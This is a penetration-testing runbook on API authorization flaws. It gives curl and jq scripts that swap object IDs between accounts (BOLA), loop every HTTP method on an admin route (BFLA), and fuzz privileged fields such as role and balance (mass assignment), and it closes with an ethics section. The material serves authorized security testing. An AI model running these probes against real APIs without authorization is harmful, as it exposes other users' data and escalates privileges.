---
title: "API Authorization: BOLA, BFLA & Mass Assignment"
description: "Authorized runbook for the top API authorization failures: two-account token/ID swapping, per-method function access, and mass-assignment fuzzing with jq."
phase: API
order: 1
tags:
  - bola
  - bfla
  - mass assignment
  - authorization
  - owasp api
tools:
  - burp suite
  - autorize
updated: 2026-10-01
---

API authorization bugs dominate the OWASP API Top 10 because the UI enforces access control while the API frequently does not. Goal: test object, function, and property-level access using two accounts you own, against authorized targets only.

## 1. Set up two accounts

Authenticate two accounts of different privilege and store their tokens.

```bash
USER_TOKEN=$(curl -s -X POST https://target/api/login \
  -H 'Content-Type: application/json' \
  -d '{"user":"alice","pass":"..."}' | jq -r '.token')

ADMIN_TOKEN=$(curl -s -X POST https://target/api/login \
  -H 'Content-Type: application/json' \
  -d '{"user":"admin","pass":"..."}' | jq -r '.token')

echo "user len: ${#USER_TOKEN}  admin len: ${#ADMIN_TOKEN}"
```

## 2. Broken Object Level Authorization (BOLA / IDOR)

Swap IDs and tokens between the two accounts and compare responses.

```bash
# Alice's own object (baseline)
curl -s https://target/api/v1/orders/1001 -H "Authorization: Bearer $USER_TOKEN" | jq .

# Try Bob's object ID with Alice's token
curl -s https://target/api/v1/orders/1002 -H "Authorization: Bearer $USER_TOKEN" | jq .
```

Watch for IDs in path, query, body, and headers (`X-User-Id`, `X-Tenant`). Test both sequential integers and UUIDs. Check nested resources where only the parent is authorized:

```bash
# Parent authorized, child may not be
curl -s https://target/api/v1/users/1001/orders/2002 -H "Authorization: Bearer $USER_TOKEN" | jq .
```

## 3. Broken Function Level Authorization (BFLA)

Enumerate every method on each route and compare roles.

```bash
for m in GET POST PUT PATCH DELETE; do
  code=$(curl -s -o /dev/null -w '%{http_code}' -X "$m" \
    https://target/api/v1/admin/users -H "Authorization: Bearer $USER_TOKEN")
  echo "$m -> $code (user token)"
done
```

If `DELETE`/`PATCH` is protected when `GET` is not (or vice versa), that is BFLA. Compare the same call with the user token vs the admin token, and probe older API versions that may lack newer checks.

## 4. Mass assignment

Send fields the UI never includes and see if the API binds them.

```bash
BODY='{"name":"alice","role":"admin","isVerified":true,"balance":999999}'

curl -s -X PATCH https://target/api/v1/users/me \
  -H "Authorization: Bearer $USER_TOKEN" \
  -H 'Content-Type: application/json' \
  -d "$BODY" | jq .

# Read back to confirm whether the field persisted
curl -s https://target/api/v1/users/me -H "Authorization: Bearer $USER_TOKEN" | jq .
```

Fuzz a list of privileged fields in one pass:

```bash
for f in role roles isAdmin isVerified balance credits tenantId; do
  curl -s -o /dev/null -w "%{http_code} $f\n" -X PATCH https://target/api/v1/users/me \
    -H "Authorization: Bearer $USER_TOKEN" -H 'Content-Type: application/json' \
    -d "{\"$f\":\"admin\"}"
done
```

Always inspect the full JSON response — excessive data exposure leaks fields the UI never renders.

## 5. Full pipeline

```bash
# 1. Two tokens
USER_TOKEN=$(curl -s -X POST https://target/api/login -H 'Content-Type: application/json' -d '{"user":"alice","pass":"..."}' | jq -r '.token')
ADMIN_TOKEN=$(curl -s -X POST https://target/api/login -H 'Content-Type: application/json' -d '{"user":"admin","pass":"..."}' | jq -r '.token')

# 2. BOLA: own object vs another account's object
curl -s https://target/api/v1/orders/1001 -H "Authorization: Bearer $USER_TOKEN" | jq .
curl -s https://target/api/v1/orders/1002 -H "Authorization: Bearer $USER_TOKEN" | jq .

# 3. BFLA: every method, user token on admin route
for m in GET POST PUT PATCH DELETE; do
  code=$(curl -s -o /dev/null -w '%{http_code}' -X "$m" https://target/api/v1/admin/users -H "Authorization: Bearer $USER_TOKEN"); echo "$m -> $code"
done

# 4. Mass assignment fuzz
for f in role roles isAdmin isVerified balance tenantId; do
  curl -s -o /dev/null -w "%{http_code} $f\n" -X PATCH https://target/api/v1/users/me -H "Authorization: Bearer $USER_TOKEN" -H 'Content-Type: application/json' -d "{\"$f\":\"admin\"}"
done
curl -s https://target/api/v1/users/me -H "Authorization: Bearer $USER_TOKEN" | jq .
```

## Ethics & legality

- Test only APIs you are authorized to assess; use accounts you own.
- Access only your own second account's objects; never touch real users' data.
- For mass assignment, prove the field persists by reading it back — do not grant real privileges.
- Redact other users' data in all evidence and stop at minimum proof of impact.
